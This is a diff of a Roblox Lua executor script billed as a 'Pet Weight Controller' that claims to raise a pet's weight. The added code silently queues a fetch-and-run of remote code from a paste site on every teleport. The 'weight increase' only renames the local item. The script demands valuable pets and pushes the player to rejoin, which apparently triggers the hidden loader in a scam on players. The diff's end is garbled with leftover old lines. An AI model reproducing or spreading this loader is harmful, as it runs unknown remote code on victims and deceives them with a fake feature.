@@ -1,116 +1,349 @@
--- Script By PhatLee (Pet Weight Editor giữ nguyên Age + Rejoin GUI)
-local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
-local LocalPlayer = Players.LocalPlayer
-local RunService = game:GetService("RunService")
+-- Auto execute khi rejoin
+local queue_on_teleport = queue_on_teleport or queueonteleport or syn and syn.queue_on_teleport
+if queue_on_teleport then
+    queue_on_teleport([[
+        loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()
+    ]])
+end
 
--- Danh sách keyword pet tốt
-local goodPets = {
-    "mimic octupus", "dragonfly", "raccoon", "disco",
-    "french", "lobster", "kitsune", "t-rex",
+-- Script By PhatLee - Pet Weight Control GUI (Only change [KG], keep everything else; Auto-resize GUI + Rejoin)
+local Players = game:GetService("Players")
+local TextService = game:GetService("TextService")
+local TweenService = game:GetService("TweenService")
+local TeleportService = game:GetService("TeleportService")
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+-- DANH SÁCH KEYWORD PET HỢP LỆ
+local validKeywords = {
+    "mimic", "dragonfly", "raccoon", "disco",
+    "french", "lobster", "kitsune", "t%-rex",
     "spinosaurus", "butterfly", "queen"
 }
 
--- Hàm lấy tool pet đang cầm
-local function getEquippedPetTool()
-    local character = LocalPlayer.Character
-    if character then
-        for _, tool in ipairs(character:GetChildren()) do
-            if tool:IsA("Tool") then
-                return tool
-            end
-        end
-    end
-    return nil
-end
-
--- Hàm lấy KG từ tên pet
-local function parsePetKG(name)
-    return tonumber(name:match("%[(%d+%.?%d*)%sKG%]"))
-end
-
--- Hàm đặt lại tên pet, giữ nguyên age & thứ tự
-local function setPetName(tool, newKG)
-    local baseName = tool.Name:gsub("%[Age%s*%d+%]", ""):gsub("%[%d+%.?%d*%sKG%]", ""):gsub("%s+$", "")
-    local agePart = tool.Name:match("%[Age%s*%d+%]")
-    if agePart then
-        tool.Name = string.format("%s [%.2f KG] %s", baseName, newKG, agePart)
-    else
-        tool.Name = string.format("%s [%.2f KG]", baseName, newKG)
-    end
-end
-
--- Hàm kiểm tra pet tốt
-local function isGoodPet(name)
-    local lowerName = name:lower()
-    for _, keyword in ipairs(goodPets) do
-        if lowerName:find(keyword) then
-            return true
-        end
-    end
-    return false
-end
-
 -- GUI chính
-local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 screenGui.Name = "PetWeightGUI"
 screenGui.ResetOnSpawn = false
 
+-- Frame chính
 local frame = Instance.new("Frame", screenGui)
-frame.Size = UDim2.new(0, 240, 0, 180)
-frame.Position = UDim2.new(0.5, -120, 0.5, -90)
-frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-frame.BackgroundTransparency = 0.1
-Instance.new("UICorner", frame)
-
--- Cho phép kéo GUI mà không reset vị trí
-local dragging, dragInput, dragStart, startPos
+frame.Size = UDim2.new(0, 260, 0, 170)
+frame.Position = UDim2.new(0.5, -130, 0.5, -85)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 frame.Active = true
-frame.Draggable = false
-frame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        startPos = frame.Position
-    end
-end)
-frame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        dragInput = input
-    end
-end)
-RunService.Heartbeat:Connect(function()
-    if dragging and dragInput then
-        local delta = dragInput.Position - dragStart
-        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
-                                   startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
-game:GetService("UserInputService").InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
+frame.Draggable = true
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 
--- Tiêu đề
+-- Title
 local title = Instance.new("TextLabel", frame)
-title.Text = "Pet Weight Editor"
+title.Text = "Pet Weight Controller"
 title.Font = Enum.Font.FredokaOne
 title.TextSize = 20
-title.Size = UDim2.new(1, 0, 0, 30)
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.BackgroundTransparency = 1
-title.TextColor3 = Color3.fromRGB(40, 40, 40)
+title.Size = UDim2.new(1, 0, 0, 28)
+title.Position = UDim2.new(0, 0, 0, 4)
 
--- Thông tin pet
+-- Close Button
+local closeButton = Instance.new("TextButton", frame)
+closeButton.Text = "X"
+closeButton.Font = Enum.Font.FredokaOne
+closeButton.TextSize = 18
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+closeButton.Size = UDim2.new(0, 28, 0, 28)
+closeButton.Position = UDim2.new(1, -34, 0, 4)
+Instance.new("UICorner", closeButton)
+closeButton.MouseButton1Click:Connect(function() frame.Visible = false end)
+
+-- Pet info label
 local petInfo = Instance.new("TextLabel", frame)
-petInfo.Text = "Please hold your pet..."
+petInfo.Text = "Equipped Pet: [None]"
 petInfo.Font = Enum.Font.FredokaOne
 petInfo.TextSize = 16
-petInfo.Size = UDim2.new(1, -10, 0, 30)
-petInfo.Position = UDim2.new(0, 5, 0, 40)
+petInfo.TextColor3 = Color3.fromRGB(255, 255, 160)
 petInfo.BackgroundTransparency = 1
-petInfo.TextColor3 = Color3.fromRGB(40, 40, 40)
-petInfo.TextWrapped = true
+petInfo.Position = UDim2.new(0, 12, 0, 36)
+petInfo.Size = UDim2.new(1, -24, 0, 20)
+petInfo.TextXAlignment = Enum.TextXAlignment.Left
+petInfo.TextWrapped = false
+
+-- Auto-resize GUI
+local function autoResizeGUI()
+	local textSize = TextService:GetTextSize(
+		petInfo.Text,
+		petInfo.TextSize,
+		petInfo.Font,
+		Vector2.new(math.huge, petInfo.AbsoluteSize.Y)
+	)
+	local padding = 40
+	local targetWidth = math.max(260, math.min(500, textSize.X + padding))
+	local tween = TweenService:Create(
+		frame,
+		TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+		{
+			Size = UDim2.new(0, targetWidth, 0, frame.Size.Y.Offset)
+		}
+	)
+	tween:Play()
+end
+
+-- Lấy pet
+local function getEquippedPetTool()
+	character = player.Character or player.CharacterAdded:Wait()
+	for _, child in pairs(character:GetChildren()) do
+		if child:IsA("Tool") and child.Name:find("KG") then
+			return child
+		end
+	end
+end
+
+-- Lấy KG
+local function parsePetName(name)
+	return tonumber(name:match("%[%s*(%d+%.?%d*)%s*KG%s*%]"))
+end
+
+-- Chỉ thay đổi [x KG], giữ nguyên Age
+local function setPetKGInPlace(tool, newKG)
+	local name = tool.Name
+	local newKGText = string.format("[%.2f KG]", newKG)
+	local replaced, count = name:gsub("%[%s*%d+%.?%d*%s*KG%s*%]", newKGText, 1)
+	if count == 0 then
+		replaced = name .. " " .. newKGText
+	end
+	tool.Name = replaced
+end
+
+-- GUI cảnh báo
+local function createCenterNotice(text, time, allowClose)
+	local f = Instance.new("Frame", screenGui)
+	f.Size = UDim2.new(0, 460, 0, 90)
+	f.Position = UDim2.new(0.5, -230, 0.35, 0)
+	f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	f.BackgroundTransparency = 0.3
+	Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)
+
+	local lbl = Instance.new("TextLabel", f)
+	lbl.Size = UDim2.new(1, -60, 1, -10)
+	lbl.Position = UDim2.new(0, 10, 0, 5)
+	lbl.BackgroundTransparency = 1
+	lbl.Font = Enum.Font.FredokaOne
+	lbl.TextSize = 16
+	lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+	lbl.TextWrapped = true
+
+	local closeBtn
+	if allowClose then
+		closeBtn = Instance.new("TextButton", f)
+		closeBtn.Text = "X"
+		closeBtn.Font = Enum.Font.FredokaOne
+		closeBtn.TextSize = 18
+		closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+		closeBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+		closeBtn.Size = UDim2.new(0, 30, 0, 30)
+		closeBtn.Position = UDim2.new(1, -35, 0, 5)
+		Instance.new("UICorner", closeBtn)
+		closeBtn.MouseButton1Click:Connect(function() f:Destroy() end)
+	end
+
+	task.spawn(function()
+		for t = time, 1, -1 do
+			lbl.Text = text:gsub("{t}", tostring(t))
+			task.wait(1)
+		end
+		if f then f:Destroy() end
+	end)
+	return f
+end
+
+-- GUI Rejoin
+local function showRejoinGUI()
+	local rg = Instance.new("Frame", screenGui)
+	rg.Size = UDim2.new(0, 300, 0, 150)
+	rg.Position = UDim2.new(0.5, -150, 0.5, -75)
+	rg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+	Instance.new("UICorner", rg).CornerRadius = UDim.new(0, 12)
+
+	local title = Instance.new("TextLabel", rg)
+	title.Text = "Wait 30s, then rejoin to see your pet"
+	title.Font = Enum.Font.FredokaOne
+	title.TextSize = 16
+	title.TextColor3 = Color3.fromRGB(255, 255, 255)
+	title.BackgroundTransparency = 1
+	title.Size = UDim2.new(1, -20, 0, 40)
+	title.Position = UDim2.new(0, 10, 0, 5)
+	title.TextWrapped = true
+
+	local rejoinBtn = Instance.new("TextButton", rg)
+	rejoinBtn.Size = UDim2.new(0, 200, 0, 40)
+	rejoinBtn.Position = UDim2.new(0.5, -100, 0.5, -20)
+	rejoinBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	rejoinBtn.Font = Enum.Font.FredokaOne
+	rejoinBtn.TextSize = 16
+	rejoinBtn.TextColor3 = Color3.fromRGB(40, 40, 40)
+	Instance.new("UICorner", rejoinBtn)
+
+	local closeBtn = Instance.new("TextButton", rg)
+	closeBtn.Text = "X"
+	closeBtn.Font = Enum.Font.FredokaOne
+	closeBtn.TextSize = 18
+	closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+	closeBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+	closeBtn.Size = UDim2.new(0, 28, 0, 28)
+	closeBtn.Position = UDim2.new(1, -34, 0, 4)
+	Instance.new("UICorner", closeBtn)
+	closeBtn.MouseButton1Click:Connect(function() rg:Destroy() end)
+
+	task.spawn(function()
+		for t = 30, 1, -1 do
+			rejoinBtn.Text = "Rejoin ("..t.."s)"
+			task.wait(1)
+		end
+		rejoinBtn.Text = "Rejoin Now"
+		rejoinBtn.MouseButton1Click:Connect(function()
+			TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
+		end)
+	end)
+end
+
+-- Khi mới execute
+task.spawn(function()
+	createCenterNotice(
+		"Please hold your pet after clicking the increase button. Also, you won't see that you're holding your pet, because I hide your pet to Jandel. (This will disappear in {t} seconds.)",
+		10,
+		false
+	)
+end)
+
+-- Kiểm tra pet hợp lệ
+local function isPetValid(name)
+	local lowerName = name:lower()
+	for _, keyword in ipairs(validKeywords) do
+		if lowerName:find(keyword) then
+			return true
+		end
+	end
+	return false
+end
+
+-- Tăng cân
+local isIncreasing = false
+local originalTool, originalKG
+
+local function increaseWeight(multiplier, add)
+	local tool = getEquippedPetTool()
+	if not tool then
+		petInfo.Text = "No Pet Equipped!"
+		autoResizeGUI()
+		return
+	end
+
+	if not isPetValid(tool.Name) then
+		createCenterNotice("This only works with good pets, please use an account with good pet.", 6, true)
+		return
+	end
+
+	local currentKG = parsePetName(tool.Name)
+	if not currentKG then
+		petInfo.Text = "Invalid Pet Format!"
+		autoResizeGUI()
+		return
+	end
+
+	if currentKG > 60 then
+		createCenterNotice("Pet weight growth too fast will make your account get banned.", 5, true)
+		return
+	end
+
+	local targetKG = multiplier and currentKG * multiplier or currentKG + add
+	if targetKG > 60 then
+		createCenterNotice("Pet weight growth too fast will make your account get banned.", 5, true)
+		return
+	end
+
+	isIncreasing = true
+	originalTool = tool
+	originalKG = currentKG
+
+	for t = 25, 1, -1 do
+		local holding = getEquippedPetTool()
+		if not holding or holding ~= originalTool then
+			setPetKGInPlace(originalTool, originalKG)
+			createCenterNotice("Please don't change your pet while weight increasing.", 5, true)
+			isIncreasing = false
+			return
+		end
+		local progress = (25 - t + 1) / 25
+		local interim = currentKG + (targetKG - currentKG) * progress
+		setPetKGInPlace(originalTool, interim)
+		petInfo.Text = "Pet weight is increasing in " .. t .. "s"
+		autoResizeGUI()
+		task.wait(1)
+	end
+
+	setPetKGInPlace(originalTool, targetKG)
+	petInfo.Text = "Equipped Pet: " .. originalTool.Name
+	autoResizeGUI()
+	isIncreasing = false
+
+	-- Sau khi xong, hiển thị GUI rejoin
+	showRejoinGUI()
+end
+
+-- Nút x2
+local btnX2 = Instance.new("TextButton", frame)
+btnX2.Text = "Increase Pet Weight by x2"
+btnX2.Font = Enum.Font.FredokaOne
+btnX2.TextSize = 16
+btnX2.TextColor3 = Color3.fromRGB(40, 40, 40)
+btnX2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+btnX2.Size = UDim2.new(0, 230, 0, 34)
+btnX2.Position = UDim2.new(0.5, -115, 0, 70)
+Instance.new("UICorner", btnX2)
+btnX2.MouseButton1Click:Connect(function()
+	increaseWeight(2, nil)
+end)
+
+-- Nút +1kg
+local btnAdd1 = Instance.new("TextButton", frame)
+btnAdd1.Text = "Increase Pet Weight by 1KG"
+btnAdd1.Font = Enum.Font.FredokaOne
+btnAdd1.TextSize = 16
+btnAdd1.TextColor3 = Color3.fromRGB(40, 40, 40)
+btnAdd1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+btnAdd1.Size = UDim2.new(0, 230, 0, 34)
+btnAdd1.Position = UDim2.new(0.5, -115, 0, 114)
+Instance.new("UICorner", btnAdd1)
+btnAdd1.MouseButton1Click:Connect(function()
+	increaseWeight(nil, 1)
+end)
+
+-- Footer
+local footer = Instance.new("TextLabel", frame)
+footer.Text = "-- Script By PhatLee --"
+footer.Font = Enum.Font.FredokaOne
+footer.TextSize = 13
+footer.TextColor3 = Color3.fromRGB(180, 180, 180)
+footer.BackgroundTransparency = 1
+footer.Size = UDim2.new(1, 0, 0, 18)
+footer.Position = UDim2.new(0, 0, 1, -24)
+
+-- Auto refresh pet info
+task.spawn(function()
+	while true do
+		if not isIncreasing then
+			local pet = getEquippedPetTool()
+			if pet then
+				petInfo.Text = "Equipped Pet: " .. pet.Name
+			else
+				petInfo.Text = "Equipped Pet: [None]"
+			end
+			autoResizeGUI()
+		end
+		task.wait(1)
+	end
+end)petInfo.TextWrapped = true
 
 -- Nút tăng gấp đôi
 local doubleButton = Instance.new("TextButton", frame)
